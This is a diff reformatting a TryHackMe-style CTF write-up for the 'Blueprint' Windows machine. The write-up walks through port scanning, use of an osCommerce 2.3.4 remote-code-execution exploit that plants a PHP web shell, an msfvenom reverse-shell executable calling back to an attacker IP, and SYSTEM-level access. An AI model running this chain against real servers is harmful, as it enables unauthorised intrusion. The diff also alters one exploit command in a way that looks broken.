@@ -24,16 +24,12 @@ This writeup documents the penetration testing of the [**Blueprint**](https://tr
 # Information Gathering
 ------------------
 
-After identifying the target's IP address, we need to enumerate as  much information as possible about the host.
-
-A quick way to get a hint of the OS is checking the TTL value from a simple ping to a host on our local network. The [**whichSystem**](https://github.com/Akronox/WichSystem.py) script can also be used for this purpose.
+After identifying the target's IP address, we need to enumerate as  much information as possible about the host. A quick way to get a hint of the OS is checking the TTL value from a simple ping to a host on our local network. The [**whichSystem**](https://github.com/Akronox/WichSystem.py) script can also be used for this purpose.
 * TTL 64: Linux.
 * TTL 128: Windows.
 
-```bash
+```
 ❯ ping -c 1 10.10.91.114
-```
-```
 PING 10.10.91.114 (10.10.91.114) 56(84) bytes of data.
 64 bytes from 10.10.91.114: icmp_seq=1 ttl=127 time=218 ms
 
@@ -44,10 +40,8 @@ rtt min/avg/max/mdev = 218.135/218.135/218.135/0.000 ms
 
 In this case, the target seems to be a Windows machine. Let's perform some scans.
 
-```bash
+```
 ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.91.114 -oG allPorts
-```
-```
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-10 21:02 CET
 Initiating SYN Stealth Scan at 21:02
@@ -94,10 +88,8 @@ Nmap done: 1 IP address (1 host up) scanned in 49.15 seconds
            Raw packets sent: 242563 (10.673MB) | Rcvd: 20178 (807.192KB)
 ```
 
-```bash
+```
 ❯ nmap -sCV -p80,135,139,443,445,3306,8080,49152,49153,49154,49158,49159,49160 10.10.91.114 -oN targeted
-```
-```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-10 21:04 CET
 Nmap scan report for 10.10.91.114
 Host is up (0.16s latency).
@@ -168,10 +160,8 @@ Nmap found some open ports, and we can determinate some things:
 - It's a Windows 7 Home Basic machine named BLUEPRINT and it's in a workgroup.
 - 3 web servers, port 445 and 139 open...
 
-```bash
+```
 ❯ whatweb http://10.10.91.114
-```
-```
 http://10.10.91.114 [404 Not Found] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/7.5], IP[10.10.91.114], Microsoft-IIS[7.5], Title[404 - File or directory not found.]
 ```
 
@@ -181,10 +171,8 @@ Nothing interesting in the web, source code or directory and file fuzzing.
 
 Let's enumerate now the port 443.
 
-```bash
+```
 ❯ whatweb https://10.10.91.114
-```
-```
 https://10.10.91.114 [200 OK] Apache[2.4.23], Country[RESERVED][ZZ], HTTPServer[Windows (32 bit)][Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28], IP[10.10.91.114], Index-Of, OpenSSL[1.0.2h], PHP[5.6.28], Title[Index of /]
 ```
 
@@ -194,10 +182,8 @@ Nothing interesting too.
 
 Now, let's enumerate the port 8080.
 
-```bash
+```
 whatweb http://10.10.91.114:8080
-```
-```
 http://10.10.91.114:8080 [200 OK] Apache[2.4.23], Country[RESERVED][ZZ], HTTPServer[Windows (32 bit)][Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28], IP[10.10.91.114], Index-Of, OpenSSL[1.0.2h], PHP[5.6.28], Title[Index of /]
 ```
 
@@ -207,10 +193,8 @@ This web server is running **oscommerce-2.3.4** as nmap specified before. This i
 
 > osCommerce is a free, open-source e-commerce platform that provides tools for creating and managing online stores. The platform is built on PHP and MySQL.
 
-```bash
+```
 ❯ gobuster dir -u http://10.10.91.114:8080/oscommerce-2.3.4/catalog/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 20 -x txt,php,html
-```
-```
 ===============================================================
 Gobuster v3.8
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -279,10 +263,8 @@ Starting gobuster in directory enumeration mode
 # Vulnerability Assessment
 -------
 
-```bash
+```
 ❯ searchsploit oscommerce 2.3.4
-```
-```
 -------------------------------------------------------------------------------------------------------------
  Exploit Title                                                                        |  Path
 -------------------------------------------------------------------------------------------------------------
@@ -356,13 +338,9 @@ else:
 
 Then, I'll start a python web server on the port 8080 and run the exploit.
 
-```bash
+```
 ❯ python3 -m http.server 8080
-```
-```bash
-❯ python 44374.py
-```
-```
+❯ python 44374
 [+] Successfully launched the exploit. Open the following URL to execute your code
 
 http://10.10.91.114:8080/oscommerce-2.3.4/catalog/install/includes/configure.php
@@ -380,10 +358,8 @@ I'll run ``configure.php`` and then run ``shell.php`` with the *cmd* parameter t
 
 We need to get an interactive shell session. I'll use ``msfvenom``.
 
-```bash
+```
 ❯ msfvenom --platform windows -p windows/shell_reverse_tcp LHOST=10.8.78.182 LPORT=4444 -f exe -o rev.exe
-```
-```
 [-] No arch selected, selecting arch: x86 from the payload
 No encoder specified, outputting raw payload
 Payload size: 324 bytes
@@ -408,28 +384,20 @@ After running the exploit I'll execute ``configure.php`` and the reverse shell b
 
 Now, execute ``shell.php?cmd=rev.exe`` while you're listening on the selected port to get the reverse shell.
 
-```bash
+```
 ❯ nc -nlvp 4444
-```
-```
 listening on [any] 4444 ...
 connect to [10.8.78.182] from (UNKNOWN) [10.10.91.114] 49513
 Microsoft Windows [Version 6.1.7601]
 Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
-```
-```powershell
 C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes>whoami
-```
-```
 nt authority\system
 ```
 
 We need to find all the flags. The root flag is in Administrator's desktop.
 
-```powershell
+```
 C:\Users\Administrator\Desktop>type root.txt.txt
-```
-```
 ***REDACTED***
 ```
 
